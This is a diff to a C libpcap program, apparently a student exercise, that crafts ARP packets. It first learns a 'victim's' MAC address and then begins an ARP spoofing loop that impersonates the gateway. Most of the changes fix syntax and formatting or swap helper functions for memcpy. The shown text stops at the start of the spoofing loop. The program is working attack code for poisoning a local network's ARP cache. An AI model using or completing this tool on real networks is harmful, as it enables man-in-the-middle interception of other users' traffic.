@@ -22,9 +22,9 @@
 #pragma pack(push,1)   //set struct alignment per 1-byte
 typedef struct _ether_hdr
 {
-	uint8_t dmac[MAC_ADDR_LEN];
-	uint8_t smac[MAC_ADDR_LEN];
-	uint16_t type;
+    uint8_t dmac[MAC_ADDR_LEN];
+    uint8_t smac[MAC_ADDR_LEN];
+    uint16_t type;
 } ether_hdr;
 
 typedef struct _arp_hdr{
@@ -68,9 +68,9 @@ void get_my_mac_addr(char *dev_name, uint8_t *mac)
     strcpy(s.ifr_name, dev_name);
     if(0 == ioctl(fd, SIOCGIFHWADDR, &s))
     {
-        for(int i = 0;i<MAC_ADDR_LEN; i++)
-            mac[i] = s.ifr_addr.sa_data[i];
-        memcpy(des, s.ifr_name.sa_data, MAC_ADDR_LEN);
+//        for(int i = 0;i<MAC_ADDR_LEN; i++)
+//            mac[i] = s.ifr_addr.sa_data[i];
+        memcpy(mac, s.ifr_addr.sa_data, MAC_ADDR_LEN);
     }
 }
 ///////////////////////////////////////////////////////////
@@ -107,8 +107,8 @@ void set_cast(uint8_t *mac,int type)
 //print mac address by pointer of MAC address
 void print_mac(uint8_t *mac_addr)
 {
-			printf("%.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
-			 mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
+    printf("%.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",
+        mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
 }
 ///////////////////////////////////////////////////////////
 //get two pointers of ip address
@@ -124,11 +124,11 @@ int ip_check(uint8_t *des, uint8_t *src)
 }
 ////////////////////////////////////////////////////////////
 //If you want to assign MAC address same as given MAC
-void mac_assign(uint8_t *des, uint8_t *src)
-{
-    for(int i=0; i<MAC_ADDR_LEN; i++)
-        des[i] = src[i];
-}
+// void mac_assign(uint8_t *des, uint8_t *src)
+// {
+//     for(int i=0; i<MAC_ADDR_LEN; i++)
+//         des[i] = src[i];
+// }
 /////////////////////////MAIN///////////////////////////////
 int main(int argc, char *argv[])
 {
@@ -143,7 +143,7 @@ int main(int argc, char *argv[])
     char *receiver_ip = argv[3];
 	char errbuf[PCAP_ERRBUF_SIZE];
 
-//network interface handle open
+    //network interface handle open
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
@@ -155,13 +155,15 @@ int main(int argc, char *argv[])
     //I must edit sender ip's 
     const u_char packet[60] = {0,}; 
 
-//to get victim's MAC addr, send to ARP request
-
+    //to get victim's MAC addr, send to ARP request
+    const u_char broadcast[MAC_ADDR_LEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
+    const u_char unkowncast[MAC_ADDR_LEN] = {0x00,};
 /////////////////////SET ETHERNET HEADER////////////////////////
     ether_hdr *eth_h = (ether_hdr *)packet;
 
     get_my_mac_addr(dev, eth_h->smac);
-    set_cast(eth_h->dmac,BROADCAST);
+//  set_cast(eth_h->dmac,BROADCAST);
+    memcpy(eth_h->dmac, broadcast, MAC_ADDR_LEN);
     eth_h->type = htons(ETHERTYPE_ARP);        //network layer protocol set ARP
     
 //////////////////////SET ARP HEADER//////////////////////////
@@ -174,7 +176,8 @@ int main(int argc, char *argv[])
     arp_h->opcode = htons(ARPOP_REQUEST);            //ARP Request
     get_my_mac_addr(dev, arp_h->Sender_HW_addr);     //assign my mac addr
     get_my_ip_addr(dev, arp_h->Sender_Proto_addr);   //assign my ip addr
-    set_cast(arp_h->Target_HW_addr, UNKOWN_TARGET);  //I don't know about the victim's MAC addr, so set 00:00:00:00:00:00
+//  set_cast(arp_h->Target_HW_addr, UNKOWN_TARGET);  //I don't know about the victim's MAC addr, so set 00:00:00:00:00:00
+    memcpy(arp_h->Target_HW_addr, unkowncast, MAC_ADDR_LEN);
     convert_str_to_ipaddr(argv[2], arp_h->Target_Proto_addr);
     
     while(1)
@@ -184,7 +187,7 @@ int main(int argc, char *argv[])
             fprintf(stderr,"[ERROR]pcap_sendpacket() error\n");
             return -1;
         }
-        printf(">>Send to ARP REQUEST packet to the victim SUCCESSLY.");
+        printf(">>Send to ARP REQUEST packet to the victim SUCCESSLY.\n");
 
         const u_char arp_reply_packet[60] = {0,};
         ether_hdr *arp_reply_eth_h = (ether_hdr *)arp_reply_packet;
@@ -208,11 +211,12 @@ int main(int argc, char *argv[])
             {
                 if(ip_check(receive_arp_h->Sender_Proto_addr, arp_h->Target_Proto_addr))
                 {   
-                    printf("<<I got ARP REPLY packet from the victim. He's mac address is")
+                    printf("<<I got ARP REPLY packet from the victim. He's mac address is");
                     print_mac(receive_arp_h->Sender_HW_addr);
-                    
-                    mac_assign(arp_h->Target_HW_addr,receive_arp_h->Sender_HW_addr);
-                    mac_assign(eth_h->dmac, receive_arp_h->Sender_HW_addr);
+                    memcpy(arp_h->Target_HW_addr, receive_arp_h->Sender_HW_addr, MAC_ADDR_LEN);
+                    memcpy(eth_h->dmac, receive_arp_h->Sender_HW_addr, MAC_ADDR_LEN);
+                //  mac_assign(arp_h->Target_HW_addr,receive_arp_h->Sender_HW_addr);
+                //  mac_assign(eth_h->dmac, receive_arp_h->Sender_HW_addr);
                     break;
                 }
                 else
@@ -224,7 +228,7 @@ int main(int argc, char *argv[])
         sleep(10);  //if arp reply is not captured, sleep 10 sec and re-send packet
     }
 
-    arp spoofing
+    //arp spoofing
     while(1)
     {
         convert_str_to_ipaddr(receiver_ip, arp_h->Sender_Proto_addr);  //arp sender protocol address=>gateway ip addr
